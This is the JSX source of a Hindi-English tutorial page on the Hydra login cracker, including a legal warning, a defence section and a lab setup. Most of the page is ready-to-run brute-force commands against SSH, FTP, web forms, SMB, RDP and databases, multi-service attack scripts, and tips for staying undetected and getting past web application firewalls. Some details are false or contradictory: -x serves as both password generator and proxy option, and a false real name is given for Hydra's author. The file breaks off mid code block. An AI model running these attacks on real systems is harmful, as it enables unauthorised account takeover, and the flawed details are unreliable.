import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Hydra() {
  return (
    <TutorialLayout
      title="hydra"
      subtitle="तेज़ नेटवर्क लॉगिन क्रैकर — 50+ प्रोटोकॉल सपोर्ट"
      icon="🔑"
      prev={{ to: '/tool/sqlmap', label: 'sqlmap' }}
      next={{ to: '/tool/john', label: 'john' }}
    >
      <h2>What is Hydra?</h2>
      <p>
        Hydra (THC-Hydra) दुनिया का सबसे तेज़ और लोकप्रिय नेटवर्क लॉगिन क्रैकर है। यह SSH, FTP, HTTP, SMB, RDP, MySQL, Telnet, SMTP — 50 से ज़्यादा प्रोटोकॉल्स को सपोर्ट करता है। डिक्शनरी अटैक और ब्रूट फोर्स दोनों कर सकता है। कमज़ोर पासवर्ड्स ढूंढने के लिए यह सबसे उपयोगी टूल है। पेनेट्रेशन टेस्टिंग और सिक्योरिटी ऑडिट में यह एक essential tool है। Hydra का मॉड्यूलर आर्किटेक्चर इसे बहुत लचीला बनाता है। हर सर्विस के लिए अलग मॉड्यूल है जिसे कस्टमाइज़ किया जा सकता है। नए मॉड्यूल भी बनाए जा सकते हैं अगर कोई सर्विस सपोर्ट नहीं है।
      </p>
      <p>
        Hydra ऑनलाइन अटैक करता है — मतलब सीधे सर्विस पर लॉगिन ट्राई करता है। इसलिए यह ऑफ़लाइन क्रैकिंग (जैसे hashcat) से थोड़ा धीमा है लेकिन ज़्यादा रियलिस्टिक है। Hydra की सबसे बड़ी खासियत इसकी स्पीड है — यह पैरलल कनेक्शन्स का इस्तेमाल करके बहुत तेज़ी से पासवर्ड्स ट्राई करता है। एक साथ 64 तक parallel connections बना सकता है। Hydra C भाषा में लिखा गया है जो इसे बहुत तेज़ और मेमोरी-एफिशिएंट बनाता है। यह Linux, Windows, macOS सभी पर चलता है।
      </p>
      <p>
        Hydra को Van Hauser (THC — The Hacker's Choice) ने बनाया था। यह ओपन सोर्स है और लगातार अपडेट होता रहता है। काली लिनक्स और काली नेटहंटर दोनों में यह प्री-इंस्टॉल्ड आता है। यह C भाषा में लिखा गया है जो इसे बहुत तेज़ और efficient बनाता है। Penetration testers, red teamers, और security auditors सभी इसे regularly use करते हैं। Hydra का मॉड्यूलर आर्किटेक्चर इसे बहुत लचीला बनाता है। हर सर्विस के लिए अलग मॉड्यूल है जिसे कस्टमाइज़ किया जा सकता है।
      </p>
      <p>
        Hydra का architecture modular है — हर protocol का अलग module है। यह design pattern नए protocols add करना आसान बनाता है। Community contributions से लगातार नए modules जुड़ते रहते हैं। Hydra का source code GitHub पर उपलब्ध है और AGPL license के तहत release हुआ है। Hydra का मॉड्यूलर आर्किटेक्चर इसे बहुत लचीला बनाता है। हर सर्विस के लिए अलग मॉड्यूल है जिसे कस्टमाइज़ किया जा सकता है। नए मॉड्यूल भी बनाए जा सकते हैं अगर कोई सर्विस सपोर्ट नहीं है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Hydra केवल अपने सिस्टम्स या अधिकृत टेस्टिंग पर ही इस्तेमाल करें। बिना अनुमति के ब्रूट फोर्स अटैक अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत इसमें 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है। केवल शैक्षिक उद्देश्यों के लिए ही इसका उपयोग करें।
      </div>

      <h2>History of Hydra</h2>
      <p>
        Hydra की शुरुआत 1999 में हुई जब Van Hauser (असली नाम David Maciejak) ने THC (The Hacker's Choice) ग्रुप के लिए यह टूल बनाया। शुरू में यह सिर्फ कुछ protocols support करता था — FTP, Telnet, और SSH। लेकिन समय के साथ इसमें नए protocols जुड़ते गए।
      </p>
      <p>
        2001 में Hydra को major rewrite किया गया और parallel connection support add हुआ। यह game changer था — speed में भारी सुधार हुआ। 2005 में HTTP form-based authentication support आया जो web application testing के लिए बहुत important था। 2013 में Hydra 8.0 release हुआ जिसमें IPv6 support, बेहतर SSL handling, और नए modules जोड़े गए।
      </p>
      <p>
        आज Hydra 50+ protocols support करता है और Kali Linux का default tool है। GitHub पर इसके 8000+ stars हैं और active development जारी है। Hydra ने network authentication testing को democratize किया — पहले जो काम manual effort से घंटों में होता था, अब minutes में हो जाता है। Hydra C भाषा में लिखा गया है जो इसे बहुत तेज़ और मेमोरी-एफिशिएंट बनाता है। यह Linux, Windows, macOS सभी पर चलता है।
      </p>

      <h2>How Hydra Works?</h2>
      <p>
        Hydra का architecture parallel brute force पर based है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Protocol Modules:</strong> हर protocol (SSH, FTP, HTTP, etc.) का अपना module है जो authentication handle करता है। हर module protocol-specific packet format और authentication flow जानता है</li>
        <li><strong className="text-white">Parallel Engine:</strong> एक साथ multiple connections बनाता है — default 16, max 64। यह Hydra की speed का secret है — multiple services एक साथ login try करते हैं</li>
        <li><strong className="text-white">Wordlist Processor:</strong> Username और password lists efficiently read करता है। Memory-mapped I/O use करता है ताकि बड़ी files भी fast process हों</li>
        <li><strong className="text-white">Session Manager:</strong> Crashed sessions resume कर सकता है (-R flag)। हर attempt को disk पर log करता है</li>
        <li><strong className="text-white">Output Engine:</strong> Results multiple formats में save करता है (text, JSON, XML)</li>
        <li><strong className="text-white">Combo Engine:</strong> user:pass pairs directly use कर सकता है — credential stuffing attacks के लिए</li>
        <li><strong className="text-white">Password Generator:</strong> Built-in password generation (-x flag) — custom charset और length specify कर सकते हो</li>
        <li><strong className="text-white">Proxy Support:</strong> HTTP/SOCKS proxy support — IP rotation के लिए</li>
        <li><strong className="text-white">Resume Support:</strong> Interrupted sessions को -R flag से resume कर सकते हो — बहुत उपयोगी है</li>
      </ul>

      <h2>Installation</h2>
      <p>
        काली नेटहंटर में Hydra पहले से इंस्टॉल्ड आता है। अगर किसी कारण से नहीं है तो आसानी से इंस्टॉल कर सकते हैं।
      </p>
      <CodeBlock
        title="Hydra Installation"
        code={`# काली लिनक्स/नेटहंटर में:
hydra -h

# Debian/Ubuntu में:
sudo apt update
sudo apt install hydra

# Fedora/RHEL में:
sudo dnf install hydra

# Arch Linux में:
sudo pacman -S hydra

# macOS में:
brew install hydra

# GUI वर्जन:
sudo apt install hydra-gtk

# सोर्स से बिल्ड (लेटेस्ट):
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra
./configure
make
sudo make install

# वर्जन चेक:
hydra -V`}
      />

      <h2>Basic Usage</h2>
      <p>
        Hydra का basic syntax बहुत simple है — target, protocol, और wordlists specify करो।
      </p>
      <CodeBlock
        title="Basic Commands"
        code={`# SSH brute force (single user):
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh

# FTP brute force:
hydra -l admin -P pass.txt 192.168.1.1 ftp

# Multiple users:
hydra -L users.txt -P pass.txt 192.168.1.1 ssh

# Web form (HTTP POST):
hydra -l admin -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Failed"

# First match stop:
hydra -l admin -P pass.txt -f 192.168.1.1 ssh

# Verbose:
hydra -l admin -P pass.txt -V 192.168.1.1 ssh

# Save results to file:
hydra -l admin -P pass.txt -o results.txt 192.168.1.1 ssh

# Custom port:
hydra -l admin -P pass.txt -s 2222 192.168.1.1 ssh`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-l user</td><td className="py-2 px-3">Single username</td><td className="py-2 px-3 font-mono text-xs">-l admin</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-L file</td><td className="py-2 px-3">Username list file</td><td className="py-2 px-3 font-mono text-xs">-L users.txt</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-p pass</td><td className="py-2 px-3">Single password</td><td className="py-2 px-3 font-mono text-xs">-p password123</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-P file</td><td className="py-2 px-3">Password list file</td><td className="py-2 px-3 font-mono text-xs">-P rockyou.txt</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-C file</td><td className="py-2 px-3">Combo file (user:pass)</td><td className="py-2 px-3 font-mono text-xs">-C combo.txt</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-t N</td><td className="py-2 px-3">Parallel tasks (default 16, max 64)</td><td className="py-2 px-3 font-mono text-xs">-t 32</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-f</td><td className="py-2 px-3">Stop on first match</td><td className="py-2 px-3 font-mono text-xs">-f</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-V</td><td className="py-2 px-3">Show each attempt</td><td className="py-2 px-3 font-mono text-xs">-V</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-o file</td><td className="py-2 px-3">Output file</td><td className="py-2 px-3 font-mono text-xs">-o results.txt</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-R</td><td className="py-2 px-3">Resume previous session</td><td className="py-2 px-3 font-mono text-xs">-R</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-s port</td><td className="py-2 px-3">Custom port</td><td className="py-2 px-3 font-mono text-xs">-s 2222</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-w sec</td><td className="py-2 px-3">Wait time between attempts</td><td className="py-2 px-3 font-mono text-xs">-w 5</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-x min:max:charset</td><td className="py-2 px-3">Generate passwords</td><td className="py-2 px-3 font-mono text-xs">-x 4:4:a1</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-S</td><td className="py-2 px-3">Use SSL</td><td className="py-2 px-3 font-mono text-xs">-S</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">-H header</td><td className="py-2 px-3">Custom HTTP header</td><td className="py-2 px-3 font-mono text-xs">-H "X-Forwarded-For: 127.0.0.1"</td></tr>
          </tbody>
        </table>
      </div>

      <h2>SSH Brute Force</h2>
      <p>
        SSH (Secure Shell) सबसे कॉमन रिमोट एक्सेस प्रोटोकॉल है। SSH brute force सबसे ज़्यादा किया जाने वाला attack है।
      </p>
      <CodeBlock
        title="SSH Attack Examples"
        code={`# Single user + wordlist:
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh

# Multiple users + wordlist:
hydra -L users.txt -P pass.txt 192.168.1.1 ssh

# Custom port:
hydra -l admin -P pass.txt -s 2222 192.168.1.1 ssh

# 16 parallel tasks (fast):
hydra -l admin -P pass.txt -t 16 192.168.1.1 ssh

# 64 parallel tasks (fastest):
hydra -l admin -P pass.txt -t 64 192.168.1.1 ssh

# Verbose (every attempt shown):
hydra -l admin -P pass.txt -V 192.168.1.1 ssh

# Stop on first match:
hydra -l admin -P pass.txt -f 192.168.1.1 ssh

# IPv6:
hydra -l admin -P pass.txt ::1 ssh

# Stealth mode (slow, less detectable):
hydra -l admin -P pass.txt -t 1 -w 10 192.168.1.1 ssh

# With output file:
hydra -l admin -P pass.txt -o ssh_results.txt 192.168.1.1 ssh`}
      />

      <h2>FTP Brute Force</h2>
      <CodeBlock
        title="FTP Attack"
        code={`# Single user:
hydra -l admin -P pass.txt 192.168.1.1 ftp

# Multiple users:
hydra -L users.txt -P pass.txt 192.168.1.1 ftp

# Custom port:
hydra -l admin -P pass.txt -s 2121 192.168.1.1 ftp

# Save results:
hydra -l admin -P pass.txt -o ftp_results.txt 192.168.1.1 ftp

# Verbose mode:
hydra -l admin -P pass.txt -V 192.168.1.1 ftp

# Anonymous FTP check:
hydra -l anonymous -p "" 192.168.1.1 ftp`}
      />

      <h2>HTTP Form Brute Force</h2>
      <p>
        Web login forms पर brute force — Hydra का सबसे powerful use case।
      </p>
      <CodeBlock
        title="HTTP POST Form Attack"
        code={`# Basic web form:
hydra -l admin -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Login Failed"

# Understanding:
# /login = form URL path
# user=^USER^&pass=^PASS^ = form fields (^USER^ and ^PASS^ replaced)
# Login Failed = error message on failed login

# With cookies:
hydra -l admin -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect" -H "Cookie: session=abc"

# HTTPS:
hydra -l admin -P pass.txt target.com https-post-form "/login:user=^USER^&pass=^PASS^:F=Failed"

# Custom headers (WAF bypass):
hydra -l admin -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Failed" -H "X-Forwarded-For: 127.0.0.1"

# With proxy:
hydra -l admin -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Failed" -x 127.0.0.1:8080

# Multiple form fields:
hydra -l admin -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^&token=static:F=Invalid credentials"

# Success-based matching (S= instead of F=):
hydra -l admin -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:S=Welcome"}

# GET method:
hydra -l admin -P pass.txt target.com http-get-form "/login:user=^USER^&pass=^PASS^:F=Failed"`}
      />

      <div className="info-box mb-6">
        <strong>💡 फॉर्म फील्ड्स कैसे पता करें:</strong>
        <ul className="mt-2 text-gray-400 text-sm space-y-1">
          <li>1. Browser में website खोलें और DevTools (F12) open करें</li>
          <li>2. Network tab पर जाएं</li>
          <li>3. गलत password से login try करें</li>
          <li>4. POST request देखें — form fields और error message note करें</li>
          <li>5. ^USER^ और ^PASS^ से replace करें</li>
          <li>6. Error message "F=" flag में डालें या success message "S=" में</li>
        </ul>
      </div>

      <h2>Supported Protocols</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Protocol</th>
              <th className="text-left py-2 px-3 text-neon-green">Port</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ssh</td><td className="font-mono text-xs">22</td><td>रिमोट शेल एक्सेस</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ftp</td><td className="font-mono text-xs">21</td><td>फाइल ट्रांसफर</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">telnet</td><td className="font-mono text-xs">23</td><td>रिमोट टर्मिनल</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">http-get/post</td><td className="font-mono text-xs">80</td><td>वेब एप्लिकेशन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">https-get/post</td><td className="font-mono text-xs">443</td><td>सिक्योर वेब</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">smb</td><td className="font-mono text-xs">445</td><td>Windows file sharing</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">rdp</td><td className="font-mono text-xs">3389</td><td>Remote Desktop</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">mysql</td><td className="font-mono text-xs">3306</td><td>MySQL database</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">postgres</td><td className="font-mono text-xs">5432</td><td>PostgreSQL database</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">smtp</td><td className="font-mono text-xs">25</td><td>Email server</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">pop3</td><td className="font-mono text-xs">110</td><td>Email receiving</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">imap</td><td className="font-mono text-xs">143</td><td>Email access</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">vnc</td><td className="font-mono text-xs">5900</td><td>Remote desktop</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">snmp</td><td className="font-mono text-xs">161</td><td>Network management</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ldap2</td><td className="font-mono text-xs">389</td><td>Directory service</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">sip</td><td className="font-mono text-xs">5060</td><td>VoIP</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Other Protocol Attacks</h2>
      <CodeBlock
        title="Common Protocol Attacks"
        code={`# SMB (Windows shares):
hydra -l admin -P pass.txt 192.168.1.1 smb

# RDP (Remote Desktop):
hydra -l administrator -P pass.txt 192.168.1.1 rdp

# MySQL:
hydra -l root -P pass.txt 192.168.1.1 mysql

# PostgreSQL:
hydra -l postgres -P pass.txt 192.168.1.1 postgres

# Telnet:
hydra -l admin -P pass.txt 192.168.1.1 telnet

# SMTP (Email):
hydra -l user@target.com -P pass.txt mail.target.com smtp

# HTTP Basic Auth:
hydra -l admin -P pass.txt target.com http-get /admin

# POP3:
hydra -l user@target.com -P pass.txt mail.target.com pop3

# IMAP:
hydra -l user@target.com -P pass.txt mail.target.com imap

# VNC:
hydra -P pass.txt 192.168.1.1 vnc

# SNMP:
hydra -P community.txt 192.168.1.1 snmp

# LDAP:
hydra -l admin -P pass.txt 192.168.1.1 ldap2

# SIP (VoIP):
hydra -l user -P pass.txt 192.168.1.1 sip`}
      />

      <h2>Username and Password Lists</h2>
      <p>
        Attack की success wordlist quality पर depend करती है।
      </p>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
        <div className="glass-card p-4">
          <h4 className="text-neon-green font-mono font-bold">rockyou.txt</h4>
          <p className="text-gray-400 text-sm">Default wordlist — 14 million passwords। Kali में /usr/share/wordlists/ में। सबसे popular wordlist।</p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-neon-green font-mono font-bold">SecLists</h4>
          <p className="text-gray-400 text-sm">GitHub पर biggest security wordlist collection। हर तरह की wordlist मिलती है — passwords, usernames, URLs।</p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-neon-green font-mono font-bold">CeWL</h4>
          <p className="text-gray-400 text-sm">Website से wordlist बनाता है। Target website के content से custom wordlist — company names, jargon।</p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-neon-green font-mono font-bold">Crunch</h4>
          <p className="text-gray-400 text-sm">Pattern-based wordlist generator। Numbers, letters, special chars — कुछ भी combination generate कर सकता है।</p>
        </div>
      </div>

      <h2>Combo File</h2>
      <CodeBlock
        title="Combo File Usage"
        code={`# Combo file format (user:pass):
# admin:admin
# root:toor
# test:test123
# admin:password123
# administrator:Password1

# Combo file use करो:
hydra -C combo.txt 192.168.1.1 ssh

# Combo file बनाओ (users + passwords combine):
# Bash loop से:
while read user; do
  while read pass; do
    echo "$user:$pass"
  done < passwords.txt
done < users.txt > combo.txt

# Python से:
python3 -c "
users = open('users.txt').read().splitlines()
passes = open('passwords.txt').read().splitlines()
for u in users:
    for p in passes:
        print(f'{u}:{p}')
" > combo.txt`}
      />

      <h2>Parallel Tasks and Speed</h2>
      <CodeBlock
        title="Speed Optimization"
        code={`# Default (16 parallel tasks):
hydra -l admin -P pass.txt target ssh

# Fast (64 parallel tasks):
hydra -l admin -P pass.txt -t 64 target ssh

# Slow (1 task — stealth mode):
hydra -l admin -P pass.txt -t 1 target ssh

# Wait between attempts (avoid detection):
hydra -l admin -P pass.txt -w 5 target ssh

# Resume interrupted attack:
hydra -R

# Output to file:
hydra -l admin -P pass.txt -o results.txt target ssh

# Generate passwords (4 chars, lowercase + digits):
hydra -l admin -x 4:4:a1 target ssh

# Generate passwords (6-8 chars, all lowercase):
hydra -l admin -x 6:8:a target ssh

# Generate passwords (4 chars, digits only):
hydra -l admin -x 4:4:1 target ssh`}
      />

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="Multi-Protocol Brute Force Script"
        code={`#!/bin/bash
# Multi-protocol brute force script

TARGET=$1
USERLIST="users.txt"
PASSLIST="rockyou.txt"
OUTPUT="hydra_results"

mkdir -p $OUTPUT

echo "[*] Target: $TARGET"
echo "[*] Starting brute force attacks..."

# SSH:
echo "[+] SSH..."
hydra -L $USERLIST -P $PASSLIST -t 16 -o $OUTPUT/ssh.txt $TARGET ssh 2>/dev/null

# FTP:
echo "[+] FTP..."
hydra -L $USERLIST -P $PASSLIST -t 16 -o $OUTPUT/ftp.txt $TARGET ftp 2>/dev/null

# SMB:
echo "[+] SMB..."
hydra -L $USERLIST -P $PASSLIST -t 16 -o $OUTPUT/smb.txt $TARGET smb 2>/dev/null

# MySQL:
echo "[+] MySQL..."
hydra -L $USERLIST -P $PASSLIST -t 16 -o $OUTPUT/mysql.txt $TARGET mysql 2>/dev/null

# RDP:
echo "[+] RDP..."
hydra -L $USERLIST -P $PASSLIST -t 16 -o $OUTPUT/rdp.txt $TARGET rdp 2>/dev/null

# Results:
echo "[*] Results:"
for f in $OUTPUT/*.txt; do
  echo "=== $(basename $f) ==="
  grep "login:" $f || echo "No credentials found"
done`}
      />

      <CodeBlock
        title="Web Form Brute Force Script"
        code={`#!/bin/bash
# Web form brute force with error detection

TARGET=$1
LOGIN_PATH=$2
USER_FIELD=$3
PASS_FIELD=$4
ERROR_MSG=$5

echo "[*] Target: $TARGET"
echo "[*] Login path: $LOGIN_PATH"
echo "[*] Error message: $ERROR_MSG"

# Build form string
FORM="$LOGIN_PATH:$USER_FIELD=^USER^&$PASS_FIELD=^PASS^:$ERROR_MSG"

echo "[*] Form string: $FORM"

# Run attack
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  -t 16 -f -V \
  $TARGET http-post-form "$FORM"`}
      />

      <h2>Hydra vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Feature</th>
              <th className="text-left py-2 px-3 text-neon-green">Hydra</th>
              <th className="text-left py-2 px-3 text-neon-green">Medusa</th>
              <th className="text-left py-2 px-3 text-neon-green">Ncrack</th>
              <th className="text-left py-2 px-3 text-neon-green">Patator</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Protocols</td><td className="py-2 px-3">50+</td><td className="py-2 px-3">25+</td><td className="py-2 px-3">12+</td><td className="py-2 px-3">30+</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Speed</td><td className="py-2 px-3">Fast</td><td className="py-2 px-3">Fast</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Fast</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">HTTP Forms</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Resume</td><td className="py-2 px-3">हाँ (-R)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Ease of Use</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Hard</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Combo File</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Password Gen</td><td className="py-2 px-3">हाँ (-x)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr><td className="py-2 px-3 text-white">Kali Default</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Connection timeout आ रहा है', a: 'Target server slow है या firewall block कर रहा है। Parallel tasks कम करो: -t 1। Wait time बढ़ाओ: -w 5।' },
          { q: 'Form fields काम नहीं कर रहे', a: 'Browser DevTools (F12) से correct fields और error message निकालो। CAPTCHA और CSRF tokens Hydra handle नहीं करता।' },
          { q: 'Account lock हो रहा है', a: 'Slow attack करो: -t 1 -w 10। Lockout policy पहले check करो। कुछ servers पर lockout time होता है।' },
          { q: 'False positives आ रहे हैं', a: 'Error message carefully set करो। "F=" flag use करो fail case के लिए। "S=" flag use करो success case के लिए।' },
          { q: 'Wordlist में password नहीं है', a: 'Better wordlist use करो (rockyou.txt, SecLists)। Custom wordlist बनाओ CeWL से। Rule-based generation try करो।' },
          { q: 'HTTPS form काम नहीं कर रहा', a: 'https-post-form use करो http-post-form की जगह। SSL flag (-S) try करो। Certificate issues के लिए -S flag।' },
          { q: 'Hydra बहुत slow है', a: 'Parallel tasks बढ़ाओ: -t 64। Network latency check करो। Target server overloaded हो सकता है।' },
          { q: 'Session resume नहीं हो रहा', a: 'hydra -R run करो। अगर काम न करे तो fresh start करो। Session file corrupt हो सकती है।' },
          { q: 'SSH connection refused आ रहा है', a: 'SSH सर्विस बंद है या पोर्ट गलत है। nmap -p 22 target_ip से चेक करो। कस्टम पोर्ट है तो -s flag यूज़ करो।' },
          { q: 'HTTP form में CSRF token है', a: 'Hydra CSRF handle नहीं करता — Python स्क्रिप्ट लिखो। requests + BeautifulSoup से CSRF token क्रैक करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Hydra attacks से कैसे बचें:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Account Lockout:</strong> 5 wrong attempts पर account lock करो (30 min के लिए) — ब्रूट फोर्स रुकेगा</li>
        <li><strong className="text-white">Fail2Ban:</strong> Automated ban — repeated failures पर IP block करो, रियल-टाइम प्रोटेक्शन</li>
        <li><strong className="text-white">Rate Limiting:</strong> Login attempts per minute limit करो — iptables या nginx से, 5 प्रति मिनट</li>
        <li><strong className="text-white">Strong Passwords:</strong> Complex passwords enforce करो — brute force impractical हो जाएगा, 12+ कैरेक्टर्स</li>
        <li><strong className="text-white">MFA:</strong> Multi-Factor Authentication enable करो — password leak होने पर भी safe, TOTP या हार्डवेयर की</li>
        <li><strong className="text-white">Monitoring:</strong> Login logs monitor करो — suspicious patterns detect करो, ELK Stack यूज़ करो</li>
        <li><strong className="text-white">IP Whitelisting:</strong> Admin panels के लिए specific IPs allow करो — बाकी सब ब्लॉक</li>
        <li><strong className="text-white">Captcha:</strong> Login forms पर CAPTCHA enable करो — automated attacks रुकेंगे</li>
        <li><strong className="text-white">Port Change:</strong> Default ports change करो (SSH: 22 → 2222) — स्कैनर्स को धोखा दो</li>
        <li><strong className="text-white">Intrusion Detection:</strong> IDS/IPS deploy करो — Snort, Suricata से रियल-टाइम अलर्ट</li>
        <li><strong className="text-white">नेटवर्क सेगमेंटेशन:</strong> क्रिटिकल सर्वर्स को अलग VLAN में रखो — लैटरल मूवमेंट रोको</li>
        <li><strong className="text-white">लॉग मॉनिटरिंग:</strong> ELK Stack या Splunk से रियल-टाइम अलर्ट — हर फेल्ड अटेम्प्ट पर नज़र</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <CodeBlock
        title="Practice Lab"
        code={`# Vulnerable VMs:
# - Metasploitable2 (SSH, FTP, Telnet enabled)
# - DVWA (web form brute force)
# - VulnHub machines
# - TryHackMe rooms

# Setup:
# 1. VirtualBox/VMware में vulnerable VM start करो
# 2. Kali VM से attack करो
# 3. दोनों same network पर हों

# Practice commands:
hydra -l admin -P /usr/share/wordlists/rockyou.txt METASPLOITABLE_IP ssh
hydra -l admin -P /usr/share/wordlists/rockyou.txt METASPLOITABLE_IP ftp
hydra -l admin -P /usr/share/wordlists/rockyou.txt DVWA_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"

# Custom practice:
# 1. SSH server setup करो (weak password)
# 2. FTP server setup करो (anonymous access)
# 3. Web app setup करो (login form)
# 4. Hydra से attack practice करो`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced Usage"
        code={`# Proxy support (IP rotation):
hydra -l admin -P pass.txt -x 127.0.0.1:8080 target ssh

# Custom headers (WAF bypass):
hydra -l admin -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=Failed" -H "User-Agent: Mozilla/5.0"

# Multiple headers:
hydra -l admin -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=Failed" -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 10.0.0.1"

# Rate limiting (stealth):
hydra -l admin -P pass.txt -w 10 -t 1 target ssh

# Resume broken session:
hydra -R

# Password generation (4 chars, lowercase + digits):
hydra -l admin -x 4:4:a1 target ssh

# Password generation (6-8 chars, all lowercase):
hydra -l admin -x 6:8:a target ssh

# Combo file (user:pass pairs):
hydra -C combo.txt target ssh

# SSL connections:
hydra -l admin -P pass.txt -S target ssh

